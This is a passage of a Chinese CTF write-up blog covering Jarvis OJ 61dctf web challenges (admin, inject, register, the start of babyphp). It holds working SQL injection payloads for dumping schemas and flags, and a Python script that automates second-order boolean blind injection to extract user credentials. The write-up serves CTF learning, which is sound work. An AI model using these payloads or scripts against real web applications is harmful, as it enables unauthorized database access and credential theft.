<span class="number">190</span>, <span class="number">97</span>, <span class="number">256</span>, <span class="number">141</span>, <span class="number">199</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">235</span>, <span class="number">73</span>, <span class="number">225</span>, <span class="number">244</span>, <span class="number">141</span>, <span class="number">123</span>, <span class="number">208</span>], [<span class="number">220</span>, <span class="number">248</span>, <span class="number">136</span>, <span class="number">245</span>, <span class="number">123</span>, <span class="number">82</span>, <span class="number">120</span>, <span class="number">65</span>, <span class="number">68</span>, <span class="number">136</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">104</span>, <span class="number">107</span>, <span class="number">172</span>, <span class="number">148</span>, <span class="number">54</span>, <span class="number">218</span>, <span class="number">42</span>, <span class="number">233</span>, <span class="number">57</span>, <span class="number">115</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">196</span>], [<span class="number">190</span>, <span class="number">34</span>, <span class="number">140</span>, <span class="number">52</span>, <span class="number">160</span>, <span class="number">34</span>, <span class="number">201</span>, <span class="number">48</span>, <span class="number">214</span>, <span class="number">33</span>, <span class="number">219</span>, <span class="number">183</span>, <span class="number">224</span>, <span class="number">237</span>, <span class="number">157</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">134</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">212</span>, <span class="number">230</span>, <span class="number">243</span>, <span class="number">236</span>, <span class="number">40</span>], [<span class="number">144</span>, <span class="number">246</span>, <span class="number">73</span>, <span class="number">161</span>, <span class="number">134</span>, <span class="number">112</span>, <span class="number">146</span>, <span class="number">212</span>, <span class="number">121</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">174</span>, <span class="number">146</span>, <span class="number">78</span>, <span class="number">235</span>, <span class="number">202</span>, <span class="number">200</span>, <span class="number">90</span>, <span class="number">254</span>, <span class="number">216</span>, <span class="number">113</span>, <span class="number">25</span>, <span class="number">114</span>, <span class="number">232</span>, <span class="number">123</span>], [<span class="number">158</span>, <span class="number">85</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">145</span>, <span class="number">21</span>, <span class="number">105</span>, <span class="number">2</span>, <span class="number">256</span>, <span class="number">69</span>, <span class="number">21</span>, <span class="number">152</span>, <span class="number">155</span>, <span class="number">88</span>, <span class="number">11</span>, <span class="number">232</span>, <span class="number">146</span>, <span class="number">238</span>, <span class="number">170</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">150</span>, <span class="number">161</span>, <span class="number">249</span>, <span class="number">236</span>], [<span class="number">251</span>, <span class="number">96</span>, <span class="number">103</span>, <span class="number">188</span>, <span class="number">188</span>, <span class="number">8</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">237</span>, <span class="number">63</span>, <span class="number">230</span>, <span class="number">128</span>, <span class="number">166</span>, <span class="number">130</span>, <span class="number">141</span>, <span class="number">112</span>, <span class="number">254</span>, <span class="number">234</span>, <span class="number">113</span>, <span class="number">250</span>, <span class="number">1</span>, <span class="number">89</span>, <span class="number">0</span>, <span class="number">135</span>, <span class="number">119</span>], [<span class="number">192</span>, <span class="number">206</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">174</span>, <span class="number">130</span>, <span class="number">164</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">153</span>, <span class="number">82</span>, <span class="number">254</span>, <span class="number">20</span>, <span class="number">133</span>, <span class="number">56</span>, <span class="number">7</span>, <span class="number">163</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">204</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">196</span>], [<span class="number">106</span>, <span class="number">63</span>, <span class="number">252</span>, <span class="number">202</span>, <span class="number">153</span>, <span class="number">6</span>, <span class="number">193</span>, <span class="number">146</span>, <span class="number">88</span>, <span class="number">118</span>, <span class="number">78</span>, <span class="number">58</span>, <span class="number">214</span>, <span class="number">168</span>, <span class="number">68</span>, <span class="number">128</span>, <span class="number">68</span>, <span class="number">35</span>, <span class="number">245</span>, <span class="number">144</span>, <span class="number">102</span>, <span class="number">20</span>, <span class="number">194</span>, <span class="number">207</span>, <span class="number">66</span>], [<span class="number">154</span>, <span class="number">98</span>, <span class="number">219</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">131</span>, <span class="number">185</span>, <span class="number">27</span>, <span class="number">162</span>, <span class="number">214</span>, <span class="number">63</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">38</span>, <span class="number">129</span>, <span class="number">170</span>, <span class="number">180</span>, <span class="number">181</span>, <span class="number">96</span>, <span class="number">165</span>, <span class="number">78</span>, <span class="number">121</span>, <span class="number">55</span>, <span class="number">214</span>], [<span class="number">193</span>, <span class="number">94</span>, <span class="number">107</span>, <span class="number">45</span>, <span class="number">83</span>, <span class="number">56</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">169</span>, <span class="number">120</span>, <span class="number">58</span>, <span class="number">105</span>, <span class="number">178</span>, <span class="number">58</span>, <span class="number">217</span>, <span class="number">18</span>, <span class="number">93</span>, <span class="number">212</span>, <span class="number">74</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">219</span>, <span class="number">89</span>, <span class="number">212</span>], [<span class="number">164</span>, <span class="number">228</span>, <span class="number">5</span>, <span class="number">133</span>, <span class="number">175</span>, <span class="number">164</span>, <span class="number">37</span>, <span class="number">176</span>, <span class="number">94</span>, <span class="number">232</span>, <span class="number">82</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">212</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">153</span>, <span class="number">119</span>, <span class="number">85</span>, <span class="number">147</span>, <span class="number">256</span>, <span class="number">130</span>, <span class="number">248</span>, <span class="number">235</span>], [<span class="number">221</span>, <span class="number">178</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">215</span>, <span class="number">200</span>, <span class="number">188</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">172</span>, <span class="number">133</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">83</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">215</span>, <span class="number">204</span>, <span class="number">141</span>, <span class="number">226</span>, <span class="number">118</span>, <span class="number">233</span>, <span class="number">156</span>], [<span class="number">236</span>, <span class="number">142</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>, <span class="number">134</span>, <span class="number">54</span>, <span class="number">239</span>, <span class="number">49</span>, <span class="number">220</span>, <span class="number">233</span>, <span class="number">216</span>, <span class="number">13</span>, <span class="number">143</span>, <span class="number">145</span>, <span class="number">112</span>, <span class="number">217</span>, <span class="number">194</span>, <span class="number">114</span>, <span class="number">221</span>, <span class="number">150</span>, <span class="number">51</span>, <span class="number">136</span>, <span class="number">31</span>, <span class="number">198</span>]])</span><br><span class="line">x = np.linalg.solve(b,a)</span><br><span class="line">print x</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">for i in x:</span><br><span class="line">    flag += chr(int(round(i)))</span><br><span class="line">print flag</span><br><span class="line">#<span class="symbol">QWB</span>&#123;<span class="symbol">R3ac7_1s_interesting</span>&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="61dctf-admin"><a href="#61dctf-admin" class="headerlink" title="[61dctf]admin"></a>[61dctf]admin</h1><p>题目入口：<a href="http://web.jarvisoj.com:32792/" target="_blank" rel="noopener">http://web.jarvisoj.com:32792/</a></p><ol><li>访问robots.txt发现admin_s3cr3t.php<blockquote><p>flag{hello guest}</p></blockquote></li><li>妈的居然是假的</li><li>抓包admin=1<blockquote><p>flag{hello_admin~}</p></blockquote></li></ol><h1 id="61dctf-inject"><a href="#61dctf-inject" class="headerlink" title="[61dctf]inject"></a>[61dctf]inject</h1><p>题目入口：<a href="http://web.jarvisoj.com:32794/" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/</a></p><blockquote><p>Hint1: 先找到源码再说吧~~</p></blockquote><ol><li><p>/index.php~找到源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</span></span><br><span class="line"><span class="php">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span></span><br><span class="line"><span class="php"><span class="comment">#当未输入table参数时，table的值默认为test;当输入了table的参数时，table的值为输入的值</span></span></span><br><span class="line"><span class="php">$table = Filter($table);</span></span><br><span class="line"><span class="php">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span></span><br><span class="line"><span class="php">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span></span><br><span class="line"><span class="php">$ret = sql_query($sql);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>先看一下这个desc</p><blockquote><p>desc table是显示数据表的表都定义了哪些字段，及各个字段的类型大小，及哪些是主键，哪些有约束条件，以及各个字段是否定义了默认值</p></blockquote></li><li><p>下面本地测试一下</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"><span class="code">+----------------+</span></span><br><span class="line">| Tables<span class="emphasis">_in_</span>test |</span><br><span class="line"><span class="code">+----------------+</span></span><br><span class="line">| liuyan         |</span><br><span class="line">| test1          |</span><br><span class="line">| test2          |</span><br><span class="line">| users          |</span><br><span class="line"><span class="code">+----------------+</span></span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; desc users;</span><br><span class="line"><span class="code">+----------+</span>--------------<span class="code">+------+</span>-----<span class="code">+---------+</span>----------------+</span><br><span class="line">| Field    | Type         | Null | Key | Default | Extra          |</span><br><span class="line"><span class="code">+----------+</span>--------------<span class="code">+------+</span>-----<span class="code">+---------+</span>----------------+</span><br><span class="line">| Id       | int(11)      | NO   | PRI | NULL    | auto<span class="emphasis">_increment |</span></span><br><span class="line"><span class="emphasis">| username | varchar(255) | NO   |     |         |                |</span></span><br><span class="line"><span class="emphasis">| password | varchar(255) | NO   |     |         |                |</span></span><br><span class="line"><span class="emphasis">+----------+--------------+------+-----+---------+----------------+</span></span><br><span class="line"><span class="emphasis">3 rows in set (0.01 sec)</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">mysql&gt; desc `users`;</span></span><br><span class="line"><span class="emphasis">+----------+--------------+------+-----+---------+----------------+</span></span><br><span class="line"><span class="emphasis">| Field    | Type         | Null | Key | Default | Extra          |</span></span><br><span class="line"><span class="emphasis">+----------+--------------+------+-----+---------+----------------+</span></span><br><span class="line"><span class="emphasis">| Id       | int(11)      | NO   | PRI | NULL    | auto_</span>increment |</span><br><span class="line">| username | varchar(255) | NO   |     |         |                |</span><br><span class="line">| password | varchar(255) | NO   |     |         |                |</span><br><span class="line"><span class="code">+----------+</span>--------------<span class="code">+------+</span>-----<span class="code">+---------+</span>----------------+</span><br><span class="line">3 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; desc <span class="emphasis">'users'</span>;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '<span class="emphasis">'users'</span>' at line 1</span><br><span class="line">mysql&gt; desc "users";</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near <span class="emphasis">'"users"'</span> at line 1</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure></li><li><p>以上我们可以看到<strong>desc table === desc `table`</strong>(反引号，这题所考察的)</p></li><li>引申出来可以知道<strong>desc `table1`  `table2`;</strong> 只要前者表存在，该语句是能执行的</li><li>根据源码可知,test表是存在的，且table是可控的，下面构造payload<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">查库:</span><br><span class="line">?table=test`  `union <span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br><span class="line">回显:</span><br><span class="line"><span class="number">61</span>d300 </span><br><span class="line"></span><br><span class="line">查表:</span><br><span class="line">?table=test<span class="symbol">`  `</span><span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="number">0x363164333030</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br><span class="line">回显:</span><br><span class="line">secret_flag,secret_test</span><br><span class="line"></span><br><span class="line">查列:</span><br><span class="line">本来想直接如此:?table=test<span class="symbol">`  `</span><span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> secret_flag</span><br><span class="line">发现被waf挡了,只能老实查列查内容</span><br><span class="line">?table=test<span class="symbol">` `</span><span class="keyword">union</span> <span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=secret_flag <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br><span class="line">发现老是不回显想要的，一时间卡住了，后来直接不加<span class="keyword">where</span>语句就成了<span class="number">233</span></span><br><span class="line">?table=test<span class="symbol">` `</span><span class="keyword">union</span> <span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br><span class="line">回显:flagUwillNeverKnow</span><br><span class="line">#?table=test<span class="symbol">` `</span><span class="keyword">union</span> <span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>这样也行</span><br><span class="line">#后面发现secret_flag改成<span class="number">0x7365637265745f666c6167</span>就行了~</span><br><span class="line"></span><br><span class="line">查内容:</span><br><span class="line">?table=test<span class="symbol">` `</span><span class="keyword">union</span> <span class="keyword">select</span> flagUwillNeverKnow <span class="keyword">from</span> secret_flag <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br><span class="line">回显:</span><br><span class="line">flag&#123;luckyGame~&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="61dctf-register"><a href="#61dctf-register" class="headerlink" title="[61dctf]register"></a>[61dctf]register</h1><p>题目入口：<a href="http://web.jarvisoj.com:32796/" target="_blank" rel="noopener">http://web.jarvisoj.com:32796/</a><br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Hint1</span>: 二次注入</span><br><span class="line"></span><br><span class="line"><span class="attribute">Hint2</span>: register 二次注入在country</span><br></pre></td></tr></table></figure></p><ol><li>index.php是一个登陆界面，fuzzing没发现注入点</li><li>一波扫描</li></ol><table><thead><tr><th>URL</th><th>响应</th><th>备注</th></tr></thead><tbody><tr><td><a href="http://web.jarvisoj.com:32796/test.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32796/test.php</a></td><td>200</td><td>NULL</td></tr><tr><td><a href="http://web.jarvisoj.com:32796/login.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32796/login.php</a></td><td>200</td><td>index.php</td></tr><tr><td><a href="http://web.jarvisoj.com:32796/config.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32796/config.php</a></td><td>200</td><td>空白页</td></tr><tr><td><a href="http://web.jarvisoj.com:32796/register.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32796/register.php</a></td><td>200</td><td>注册页</td></tr><tr><td><a href="http://web.jarvisoj.com:32796/hacker.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32796/hacker.php</a></td><td>200</td><td>waf页</td></tr></tbody></table><ol start="3"><li>注册一波<blockquote><p>country=China&amp;username=jax&amp;password=123&amp;address=123</p></blockquote></li><li>根据提示找到country页面/index.php?page=info，发现</li></ol><table><thead><tr><th>Country</th><th>Address</th><th>Date</th></tr></thead><tbody><tr><td>China</td><td>123</td><td>2019-09-18 19:41:21</td></tr></tbody></table><ol start="5"><li>注入点在country,分别尝试’or’2’&lt;’1’#</li></ol><table><thead><tr><th>Country</th><th>Address</th><th>Date</th></tr></thead><tbody><tr><td>&lt;’or\‘2\‘&lt;\‘1\‘#</td><td>123</td><td>2019-09-18 12:08:07</td></tr></tbody></table><ol start="6"><li>基本是知道了语句的执行与否会带来时间的不同，大概是时区问题吧，正确就是北京时间，这样就是一个布尔盲注了</li><li>二次注入也是第一次接触，参考网上payload并分析一下<blockquote><p>‘ or ascii(substr((select group_concat(a) from(select 1,2,3`a`,4,5 union select * from users)`b`),1,1))&gt;0x19#</p></blockquote></li></ol><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line"><span class="code">+----+</span>----------<span class="code">+----------+</span></span><br><span class="line">| Id | username | password |</span><br><span class="line"><span class="code">+----+</span>----------<span class="code">+----------+</span></span><br><span class="line">|  1 | root     | root     |</span><br><span class="line">|  2 | admin    | admin    |</span><br><span class="line">|  3 | test     | test     |</span><br><span class="line"><span class="code">+----+</span>----------<span class="code">+----------+</span></span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT GROUP<span class="emphasis">_CONCAT(a) FROM (SELECT 1,2,3`a` UNION SELECT * from users)`b`;</span></span><br><span class="line"><span class="emphasis">+-------------------+</span></span><br><span class="line"><span class="emphasis">| GROUP_</span>CONCAT(a)   |</span><br><span class="line"><span class="code">+-------------------+</span></span><br><span class="line">| 3,root,admin,test |</span><br><span class="line"><span class="code">+-------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT GROUP<span class="emphasis">_CONCAT(a) FROM (SELECT 1,2,3 as `a` UNION SELECT * from users)as `b`;</span></span><br><span class="line"><span class="emphasis">+-------------------+</span></span><br><span class="line"><span class="emphasis">| GROUP_</span>CONCAT(a)   |</span><br><span class="line"><span class="code">+-------------------+</span></span><br><span class="line">| 3,root,admin,test |</span><br><span class="line"><span class="code">+-------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT GROUP<span class="emphasis">_CONCAT(a) FROM (SELECT 1,2,3 as `a` UNION SELECT * from users);</span></span><br><span class="line"><span class="emphasis">ERROR 1248 (42000): Every derived table must have its own alias</span></span><br></pre></td></tr></table></figure><ol start="8"><li><p>通过测试可知3 as `a` === 3`a` ,为什么这样，主要是因为country有长度限制，而后面的`b`则是语法问题需要如此</p></li><li><p>下面直接上脚本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">import datetime</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"><span class="keyword">start</span> = datetime.datetime.now()</span><br><span class="line">url0 = <span class="string">"http://web.jarvisoj.com:32796/index.php"</span></span><br><span class="line">url1 = <span class="string">"http://web.jarvisoj.com:32796/register.php"</span></span><br><span class="line">url2 = <span class="string">"http://web.jarvisoj.com:32796/login.php"</span></span><br><span class="line">url3 = <span class="string">"http://web.jarvisoj.com:32796/index.php?page=info"</span></span><br><span class="line"></span><br><span class="line">sqlquery = <span class="string">"SELECT GROUP_CONCAT(a) FROM (SELECT 1,2,3`a`,4,5 UNION SELECT * from users)`b`"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">result</span> = <span class="string">''</span></span><br><span class="line"><span class="keyword">num</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">length</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">finish</span> = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="keyword">check</span>():<span class="comment">#使用group_concat会出现,</span></span><br><span class="line">    <span class="keyword">count</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">result</span>:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">','</span>:</span><br><span class="line">            <span class="keyword">count</span> += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">count</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> <span class="keyword">finish</span>:</span><br><span class="line">    <span class="keyword">left</span> = <span class="number">0x19</span></span><br><span class="line">    <span class="keyword">right</span> = <span class="number">0x81</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">mid</span> = (<span class="keyword">left</span> + <span class="keyword">right</span>) // <span class="number">2</span></span><br><span class="line">        data1 = &#123;</span><br><span class="line">            <span class="string">"country"</span>: <span class="string">"'or ASCII(SUBSTR((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;#"</span>.format(sqlquery, <span class="keyword">length</span>, <span class="keyword">mid</span>),</span><br><span class="line">            <span class="string">"username"</span>: <span class="string">"9Cy9Nus"</span>+<span class="keyword">str</span>(<span class="keyword">num</span>),</span><br><span class="line">            <span class="string">"password"</span>: <span class="string">"123"</span>,</span><br><span class="line">            <span class="string">"address"</span>: <span class="string">"123"</span></span><br><span class="line">        &#125;</span><br><span class="line">        data2 = &#123;</span><br><span class="line">            <span class="string">"username"</span>: <span class="string">"9Cy9Nus"</span>+<span class="keyword">str</span>(<span class="keyword">num</span>),</span><br><span class="line">            <span class="string">"password"</span>: <span class="string">"123"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">num</span> += <span class="number">1</span></span><br><span class="line">        s = requests.session()</span><br><span class="line">        s.get(url0)</span><br><span class="line">        s.post(url1, <span class="keyword">data</span>=data1)</span><br><span class="line">        s.post(url2, <span class="keyword">data</span>=data2)</span><br><span class="line">        res = s.get(url3)</span><br><span class="line">        <span class="built_in">text</span> = res.text</span><br><span class="line">        print data1[<span class="string">'country'</span>]</span><br><span class="line">        <span class="comment">#根据做题时间修改(一般错误是后退8小时)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'&lt;em&gt;2019-09-18 16'</span> <span class="keyword">in</span> <span class="built_in">text</span>:<span class="comment">#语句正确</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">mid</span> == <span class="keyword">left</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">left</span> == <span class="number">0x19</span>:</span><br><span class="line">                    <span class="comment">#finish = True</span></span><br><span class="line">                    break</span><br><span class="line">                print <span class="string">'result: '</span>+<span class="keyword">str</span>(<span class="keyword">left</span>)</span><br><span class="line">                <span class="keyword">result</span> += <span class="keyword">chr</span>(<span class="keyword">left</span>)</span><br><span class="line">                print <span class="keyword">result</span></span><br><span class="line">                break</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">left</span> = <span class="keyword">left</span></span><br><span class="line">            <span class="keyword">right</span> = <span class="keyword">mid</span></span><br><span class="line">        <span class="keyword">else</span>:<span class="comment">#语句正确</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">mid</span> == <span class="keyword">left</span>:</span><br><span class="line">                print <span class="string">'result: '</span>+<span class="keyword">str</span>(<span class="keyword">right</span>)</span><br><span class="line">                <span class="keyword">result</span> += <span class="keyword">chr</span>(<span class="keyword">right</span>)</span><br><span class="line">                print <span class="keyword">result</span></span><br><span class="line">                break</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">left</span> = <span class="keyword">mid</span></span><br><span class="line">            <span class="keyword">right</span> = <span class="keyword">right</span></span><br><span class="line">    <span class="keyword">length</span> += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">check</span>() == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">finish</span> = <span class="literal">True</span></span><br><span class="line">print <span class="keyword">result</span></span><br><span class="line"><span class="keyword">end</span> = datetime.datetime.now()</span><br><span class="line">print (<span class="keyword">end</span>-<span class="keyword">start</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9a73fd18fedd9643357ffe20b9d974e4</span></span><br><span class="line"><span class="comment"># CleverBoy</span></span><br></pre></td></tr></table></figure></li><li><p>借鉴大佬的脚本，<del>其实就是直接用</del></p></li></ol><p><a href="https://www.cnblogs.com/sijidou/p/10573275.html" target="_blank" rel="noopener">参考1</a><br><a href="http://mitah.cn/index.php/archives/8/" target="_blank" rel="noopener">参考2</a></p><h1 id="61dctf-babyphp"><a href="#61dctf-babyphp" class="headerlink" title="[61dctf]babyphp"></a>[61dctf]babyphp</h1><p>题目入口：<a href="http://web.jarvisoj.com:32798/" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/</a></p><blockquote><p>Hint1: 此题缺少关键解题文件的问题已修复。</p></blockquote><ol><li><p>?page=about</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">About</span></span><br><span class="line">昨儿做梦的时候我在梦里写了这个网站</span><br><span class="line"></span><br><span class="line">印象中我用了这些东西:</span><br><span class="line"></span><br><span class="line">PHP</span><br><span class="line">GIT</span><br><span class="line"><span class="keyword">Bootstrap</span></span><br></pre></td></tr></table></figure></li><li><p>看到git想到源码泄露<a href="https://www.freebuf.com/sectool/66096.html" target="_blank" rel="noopener">一个git泄露利用脚本</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 